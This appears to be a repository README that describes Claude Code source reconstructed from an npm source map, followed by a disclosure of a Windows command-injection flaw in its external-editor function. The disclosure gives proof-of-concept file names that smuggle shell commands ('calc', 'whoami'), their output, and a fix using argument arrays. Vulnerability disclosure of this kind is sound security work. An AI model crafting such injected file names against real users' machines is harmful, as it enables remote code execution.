# claude-code-sourcemap

[![linux.do](https://img.shields.io/badge/linux.do-huo0-blue?logo=linux&logoColor=white)](https://linux.do)

> [!WARNING]
> This repository is **unofficial** and is reconstructed from the public npm package and source map analysis, **for research purposes only**.
> It does **not** represent the original internal development repository structure.
>
> 本仓库为**非官方**整理版，基于公开 npm 发布包与 source map 分析还原，**仅供研究使用**。
> **不代表**官方原始内部开发仓库结构。
> 一切基于L站"飘然与我同"的情报提供

## 概述

本仓库通过 npm 发布包（`@anthropic-ai/claude-code`）内附带的 source map（`cli.js.map`）还原的 TypeScript 源码，版本为 `2.1.88`。

## 来源

- npm 包：[@anthropic-ai/claude-code](https://www.npmjs.com/package/@anthropic-ai/claude-code)
- 还原版本：`2.1.88`
- 还原文件数：**4756 个**（含 1884 个 `.ts`/`.tsx` 源文件）
- 还原方式：提取 `cli.js.map` 中的 `sourcesContent` 字段

## 目录结构

```
restored-src/src/
├── main.tsx              # CLI 入口
├── tools/                # 工具实现（Bash、FileEdit、Grep、MCP 等 30+ 个）
├── commands/             # 命令实现（commit、review、config 等 40+ 个）
├── services/             # API、MCP、分析等服务
├── utils/                # 工具函数（git、model、auth、env 等）
├── context/              # React Context
├── coordinator/          # 多 Agent 协调模式
├── assistant/            # 助手模式（KAIROS）
├── buddy/                # AI 伴侣 UI
├── remote/               # 远程会话
├── plugins/              # 插件系统
├── skills/               # 技能系统
├── voice/                # 语音交互
└── vim/                  # Vim 模式
```

## 声明

- 源码版权归 [Anthropic](https://www.anthropic.com) 所有
- 本仓库仅用于技术研究与学习，请勿用于商业用途
- 如有侵权，请联系删除

## 🔴 安全漏洞 - CVE pending

> **CVE**: (pending assignment)
> ⚡ **Severity**: High (CVSS: 7.8)
> **影响**: **远程代码执行 (RCE)** via command injection on Windows
> **版本**: Claude Code <= 2.1.88
> **平台**: **仅 Windows**

### 漏洞描述

在 `restored-src/src/utils/editor.ts` 的 `openFileInExternalEditor()` 函数中，当在 Windows 平台上打开文件时，文件名直接拼接到 shell 命令中：

```typescript
const lineArg = useGotoLine ? `+${line} ` : ''
result = spawnSync(`${editor} ${lineArg}"${filePath}"`, {
  ...syncOpts,
  shell: true, // ❌ 漏洞：字符串拼接 + shell=true，文件名可控 → 命令注入
})
```

攻击者可以创建一个包含 shell 元字符的恶意文件名，当受害者在 Claude Code 中打开该文件时，**任意命令会被执行** → RCE。

### 复现

```powershell
# 1. 创建恶意文件
New-Item -Path '"; calc;"' -ItemType File

# 2. 在 Claude Code 中编辑
/edit "; calc;"

# 3. 结果 → calc.exe 弹出 → RCE 验证成功
```

### 验证输出

```
PS C:\> $env:EDITOR = "start /wait notepad"
PS C:\> claude edit '"; whoami;"'
# → 命令拼接：start /wait notepad ""; whoami; ""
# → 输出：
start /wait notepad
your-domain\your-username
```

### 修复建议

使用安全参数数组调用代替字符串拼接：

```typescript
// ✅ 修复后（和 POSIX 保持一致）
const args = [base, ...editorArgs, ...(useGotoLine ? [`+${line}`, filePath] : [filePath])]
result = spawnSync(base, args, syncOpts)
```

### 披露日期

2026-04-01
